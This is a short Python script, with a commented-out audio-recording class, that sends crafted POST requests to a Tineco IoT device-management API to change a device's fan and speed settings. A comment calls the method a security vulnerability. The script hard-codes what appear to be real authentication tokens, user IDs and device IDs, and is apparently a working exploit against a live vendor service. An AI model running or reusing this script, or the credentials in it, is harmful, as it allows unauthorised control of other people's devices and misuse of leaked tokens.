# # coding=utf-8
# import threading
# import pyaudio
# import wave
# import time
#
#
# class RecordThread(threading.Thread):
#     def __init__(self, audiofile="test.wav"):
#         threading.Thread.__init__(self)
#         self.bRecord = True
#         self.audiofile = audiofile
#         self.chunk = 1024
#         self.format = pyaudio.paInt16
#         self.channels = 1
#         self.rate = 16000
#
#     def run(self):
#         audio = pyaudio.PyAudio()
#         wavfile = wave.open(self.audiofile, 'wb')
#         wavfile.setnchannels(self.channels)
#         wavfile.setsampwidth(audio.get_sample_size(self.format))
#         wavfile.setframerate(self.rate)
#         wavstream = audio.open(format=self.format,
#                                channels=self.channels,
#                                rate=self.rate,
#                                input=True,
#                                frames_per_buffer=self.chunk)
#         while self.bRecord:
#             wavfile.writeframes(wavstream.read(self.chunk))
#         wavstream.stop_stream()
#         wavstream.close()
#         audio.terminate()
#
#     def stoprecord(self):
#         self.bRecord = False
#
#
# audio_record = RecordThread()
# audio_record.start()
# print("开始说话")
# time.sleep(5)
# print("结束")
# audio_record.stoprecord()
import requests
import json
import time
#**************************************************************这是一个安全漏洞*****************************************

def changesp():
    print("开始调速")
    for vp in range(90,91):
        print("开始")
        url = 'https://portal.tineco.com/api/iot/devmanager.do'
        headers = {'Content-Type': 'application/json', 'User-Agent': 'Apache-HttpClient/4.5.6 (Java/1.8.0_151)'}
        #data = {"td": "q", "toId": "8232ea45-61c4-4d2c-a9a2-3857997735d8", "toType": "q5ez2q", "toRes": "cdS1", "cmdName": "cfp", "payloadType": "j", "auth": {"with": "users", "userid": "cl1hnpu7de7b122e", "realm": "ecouser.net", "token": "token=gjZiTS7HLeV80sj3aqlWpCnmXY9d0EFG", "resource": "default75fa31a8"}, "payload": {"fs": 0, "sm": 0, "vp": 15}}
        data = {"td":"q","toId":"8232ea45-61c4-4d2c-a9a2-3857997735d8","toType":"q5ez2q","toRes":"45IQ","cmdName":"cfp","payloadType":"j","auth":{"with":"users","userid":"cl1hnpu7de7b122e","realm":"ecouser.net","token":"4MAYsC2CXl9hJekypV4YjngjLrIpiBOw","resource":"default75fa31a8"},"payload":{"fs":1,"sm":1,"vp":vp}}
        print(data)
        t = requests.post(url, data=json.dumps(data), headers=headers)
        print(t)
        print("。。。。。。。")
        time.sleep(5)
        data = {"td":"q","toId":"8232ea45-61c4-4d2c-a9a2-3857997735d8","toType":"q5ez2q","toRes":"cdS1","cmdName":"cfp","payloadType":"j","auth":{"with":"users","userid":"cl1hnpu7de7b122e","realm":"ecouser.net","token":"4MAYsC2CXl9hJekypV4YjngjLrIpiBOw","resource":"default75fa31a8"},"payload":{"fs":1,"sm":0,"vp":15}}
        t1 = requests.post(url, data=json.dumps(data), headers=headers)
        time.sleep(2)
        data = {"td": "q", "toId": "8232ea45-61c4-4d2c-a9a2-3857997735d8", "toType": "q5ez2q", "toRes": "45IQ",
                "cmdName": "cfp", "payloadType": "j",
                "auth": {"with": "users", "userid": "cl1hnpu7de7b122e", "realm": "ecouser.net",
                         "token": "gjZiTS7HLeV80sj3aqlWpCnmXY9d0EFG", "resource": "default75fa31a8"},
                "payload": {"fs": 0, "sm": 0, "vp": 15}}
        print(data)
        print(type(data))

        r = requests.post(url, data=json.dumps(data), headers=headers)
        print(r)
        #time.sleep(0.2)
    r.close()

#
if __name__=='__main__':
    changesp()